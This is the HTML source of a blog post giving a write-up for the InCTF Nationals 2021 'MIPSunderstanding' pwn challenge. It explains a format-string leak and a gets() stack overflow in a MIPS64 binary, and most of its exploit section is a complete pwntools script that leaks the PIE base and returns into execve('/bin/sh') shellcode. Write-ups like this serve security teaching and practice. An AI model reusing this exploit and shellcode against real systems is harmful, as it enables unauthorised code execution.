@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Checksec123456Arch:     mips-64-littleRELRO:    No RELROStack:    No canary foundNX:       NX enabledPIE:      PIE enabledRWX:      Has RWX segments  OverviewChallenge files : MIPSunderstanding 1chal">
+<meta property="og:type" content="article">
+<meta property="og:title" content="InCTF Nationals 2021 MIPSunderstanding writeup">
+<meta property="og:url" content="http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/index.html">
+<meta property="og:site_name" content="4n0nym4u5">
+<meta property="og:description" content="Checksec123456Arch:     mips-64-littleRELRO:    No RELROStack:    No canary foundNX:       NX enabledPIE:      PIE enabledRWX:      Has RWX segments  OverviewChallenge files : MIPSunderstanding 1chal">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/qUtdCzM.png">
+<meta property="og:image" content="https://imgur.com/21z6F5S.png">
+<meta property="og:image" content="https://imgur.com/uhEsnyT.png">
+<meta property="og:image" content="https://imgur.com/jcPHCE5.png">
+<meta property="og:image" content="https://imgur.com/arvqUwR.png">
+<meta property="og:image" content="https://asciinema.org/a/461708.svg">
+<meta property="article:published_time" content="2022-01-10T12:56:00.000Z">
+<meta property="article:modified_time" content="2023-02-01T17:27:24.934Z">
+<meta property="article:author" content="4n0nym4u5">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="stack">
+<meta property="article:tag" content="shellcode">
+<meta property="article:tag" content="mips">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/qUtdCzM.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>InCTF Nationals 2021 MIPSunderstanding writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/01/14/CArot/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/01/07/listbook/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&text=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&title=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&is_video=false&description=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=InCTF Nationals 2021 MIPSunderstanding writeup&body=Check out this article: http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&title=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&title=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&title=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&title=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&name=InCTF Nationals 2021 MIPSunderstanding writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&t=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Checksec"><span class="toc-number">1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Overview"><span class="toc-number">2.</span> <span class="toc-text">Overview</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#keita"><span class="toc-number">2.1.</span> <span class="toc-text">keita</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thiago"><span class="toc-number">2.2.</span> <span class="toc-text">thiago</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Setting-up-the-debug-environment"><span class="toc-number">3.</span> <span class="toc-text">Setting up the debug environment</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        InCTF Nationals 2021 MIPSunderstanding writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">4n0nym4u5</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-10T12:56:00.000Z" itemprop="datePublished">2022-01-10</time>
+        
+        (Updated: <time datetime="2023-02-01T17:27:24.934Z" itemprop="dateModified">2023-02-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/mips/" rel="tag">mips</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="tag-link-link" href="/tags/shellcode/" rel="tag">shellcode</a>, <a class="tag-link-link" href="/tags/stack/" rel="tag">stack</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="https://i.imgur.com/qUtdCzM.png" title="MIPSunderstanding"></p>
+<h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">mips-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="string">PIE</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">RWX:</span>      <span class="string">Has</span> <span class="string">RWX</span> <span class="string">segments</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>Challenge files : <a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/tree/main/MIPSunderstanding"></a><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/tree/main/MIPSunderstanding">MIPSunderstanding</a></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">chall:</span> <span class="string">ELF</span> <span class="number">64</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">pie</span> <span class="string">executable,</span> <span class="string">MIPS,</span> <span class="string">MIPS-III</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">with</span> <span class="string">debug_info,</span> <span class="string">not</span> <span class="string">stripped</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgur.com/21z6F5S.png"> I dont know mips assembly and i solved it without understanding mips :)) . It’s an easy challenge. Lets open the binary in ghidra and analyse the binary. Well there’s alot of junk code in it so ill straight up show you the <code>thiago</code> and <code>keita</code> function.</p>
+<h2 id="keita"><a href="#keita" class="headerlink" title="keita"></a>keita</h2><p><img src="https://imgur.com/uhEsnyT.png"></p>
+<h2 id="thiago"><a href="#thiago" class="headerlink" title="thiago"></a>thiago</h2><p><img src="https://imgur.com/jcPHCE5.png"></p>
+<p>So there are two bugs here.</p>
+<ol>
+<li>Format string bug for Information disclosure bug. We control the first parameter passed to printf and we can use this bug to leak the address where the binary is being loaded and bypass ASLR. </li>
+<li>A stack buffer overflow bug because of using the gets function to read input.</li>
+</ol>
+<p>Now lets dive into exploitation. But the most important part is to setup an debug environment for mips.</p>
+<h1 id="Setting-up-the-debug-environment"><a href="#Setting-up-the-debug-environment" class="headerlink" title="Setting up the debug environment"></a>Setting up the debug environment</h1><p>I always use this template given by <a target="_blank" rel="noopener" href="https://twitter.com/X3eRo0">X3eRo0</a> to debug different arch pwn challenges</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.9</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rootkit <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = context.binary = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.bits = <span class="number">64</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tilix&quot;</span>,<span class="string">&quot;-a&quot;</span>,<span class="string">&quot;session-add-right&quot;</span>,<span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">context.rename_corefiles = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">target remote 0.0.0.0:1324</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">exploit=<span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> args.GDB:</span><br><span class="line">    io = process([<span class="string">&quot;./qemu-mips64el&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1324&quot;</span>, exe.path])</span><br><span class="line">    <span class="keyword">if</span> os.fork() == <span class="number">0</span>:</span><br><span class="line">        a = <span class="built_in">open</span>(<span class="string">&quot;/tmp/gdb.gdb&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">        a.write(gdbscript)</span><br><span class="line">        a.close()</span><br><span class="line">        cmd = <span class="string">&quot; &quot;</span>.join(context.terminal) + <span class="string">&quot; gdb-multiarch %s -x /tmp/gdb.gdb&quot;</span> % exe.path</span><br><span class="line">        os.system(cmd)</span><br><span class="line">        os.kill(os.getpid(), <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote(<span class="string">&quot;gc1.eng.run&quot;</span>, <span class="string">&quot;32113&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>so with this <code>expl.py</code> you can debug the pwn challenge easily.</p>
+<p><img src="https://imgur.com/arvqUwR.png" alt="debug-setup"><br>Also one more thing to mention here</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwndbg checksec command outside qemu  </span></span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">mips-64-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="string">PIE</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">RWX:</span>      <span class="string">Has</span> <span class="string">RWX</span> <span class="string">segments</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gef checksec command inside qemu</span></span><br><span class="line"><span class="string">gef➤</span>  <span class="string">checksec</span></span><br><span class="line"><span class="attr">Canary                        :</span> <span class="string">✘</span> </span><br><span class="line"><span class="attr">NX                            :</span> <span class="string">✘</span> </span><br><span class="line"><span class="attr">PIE                           :</span> <span class="string">✓</span> </span><br><span class="line"><span class="attr">Fortify                       :</span> <span class="string">✘</span> </span><br><span class="line"><span class="attr">RelRO                         :</span> <span class="string">✘</span> </span><br></pre></td></tr></table></figure>
+
+<p><strong>NX is actually <em>disabled</em> inside qemu</strong>. To enable NX they have to patch the qemu binary. Also use gdb-gef instead of pwndbg because pwndbg has alot of issues when it comes to weird architectures.</p>
+<p>Lets start to build exploit.</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><ol>
+<li>Use the <code>keita</code> function to leak pie address</li>
+<li>Use the <code>thiago</code> function to overflow the stack and return to your shellcode</li>
+</ol>
+<figure class="highlight python"><figcaption><span>expl.py</span><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/4n0nym4u5/CTF-Writeups/main/MIPSunderstanding/exploit.py">expl.py</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.9</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rootkit <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = context.binary = ELF(<span class="string">&#x27;./chall&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.bits = <span class="number">64</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tilix&quot;</span>,<span class="string">&quot;-a&quot;</span>,<span class="string">&quot;session-add-right&quot;</span>,<span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">context.rename_corefiles = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">target remote 0.0.0.0:1324</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">exploit=<span class="string">&quot;A&quot;</span>*<span class="number">512</span></span><br><span class="line"><span class="keyword">if</span> args.GDB:</span><br><span class="line">    io = process([<span class="string">&quot;./qemu-mips64el&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1324&quot;</span>, exe.path])</span><br><span class="line">    <span class="keyword">if</span> os.fork() == <span class="number">0</span>:</span><br><span class="line">        a = <span class="built_in">open</span>(<span class="string">&quot;/tmp/gdb.gdb&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">        a.write(gdbscript)</span><br><span class="line">        a.close()</span><br><span class="line">        cmd = <span class="string">&quot; &quot;</span>.join(context.terminal) + <span class="string">&quot; gdb-multiarch %s -x /tmp/gdb.gdb&quot;</span> % exe.path</span><br><span class="line">        os.system(cmd)</span><br><span class="line">        os.kill(os.getpid(), <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process([<span class="string">&quot;./qemu-mips64el&quot;</span>, exe.path])</span><br><span class="line"></span><br><span class="line">reu(<span class="string">b&quot;+---------------------------------------+\n&quot;</span>)</span><br><span class="line">reu(<span class="string">b&quot;+---------------------------------------+\n&quot;</span>)</span><br><span class="line">sl(<span class="string">b&quot;A&quot;</span>)</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">reu(<span class="string">b&quot;Enter the price you are willing to offer !!\n&quot;</span>)</span><br><span class="line">sl(<span class="string">b&quot;%1$p&quot;</span>)</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">main=<span class="built_in">int</span>(GetInt()[<span class="number">0</span>])-<span class="number">0x18240b4</span></span><br><span class="line">exe.address = main-exe.sym.main</span><br><span class="line">shellcode_addr=exe.address+<span class="number">0x1827d80</span>+<span class="number">0x30</span></span><br><span class="line">info(<span class="string">f&quot;Pie base : <span class="subst">&#123;<span class="built_in">hex</span>(exe.address)&#125;</span>&quot;</span>)</span><br><span class="line">info(<span class="string">f&quot;Shellcode: <span class="subst">&#123;<span class="built_in">hex</span>(shellcode_addr)&#125;</span>&quot;</span>)</span><br><span class="line">sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">re()</span><br><span class="line">sl(<span class="string">b&quot;C&quot;</span>)</span><br><span class="line">padding=<span class="string">b&quot;A&quot;</span>*<span class="number">32</span></span><br><span class="line">rop = flat([</span><br><span class="line">    padding,</span><br><span class="line">    <span class="number">0xdeadbeef</span>,</span><br><span class="line">    exe.address+<span class="number">0x1827d80</span>,</span><br><span class="line">])</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">re()</span><br><span class="line">shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x62\x69\x0c\x3c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x2f\x2f\x8c\x35&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xac\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x73\x68\x0d\x3c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6e\x2f\xad\x35&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xad\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfc\xff\xa0\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa4\x67&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x05\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x06\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xc1\x13\x02\x24&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x01\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.exploit-db.com/exploits/45287</span></span><br><span class="line"></span><br><span class="line">sl(rop + <span class="string">b&quot;\x00\x00\x00\x00&quot;</span>*<span class="number">32</span> + shellcode) <span class="comment"># \x00\x00\x00\x00 is nops in mips64</span></span><br><span class="line">reu(<span class="string">b&quot;+---------------------------------------+\n&quot;</span>)</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://asciinema.org/a/461708"><img src="https://asciinema.org/a/461708.svg" alt="asciicast"></a></p>
+<blockquote>
+<p>InCTF{w3_sh4ll_not_b3_m0v3D_132244345}</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Checksec"><span class="toc-number">1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Overview"><span class="toc-number">2.</span> <span class="toc-text">Overview</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#keita"><span class="toc-number">2.1.</span> <span class="toc-text">keita</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thiago"><span class="toc-number">2.2.</span> <span class="toc-text">thiago</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Setting-up-the-debug-environment"><span class="toc-number">3.</span> <span class="toc-text">Setting up the debug environment</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&text=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&title=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&is_video=false&description=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=InCTF Nationals 2021 MIPSunderstanding writeup&body=Check out this article: http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&title=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&title=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&title=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&title=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
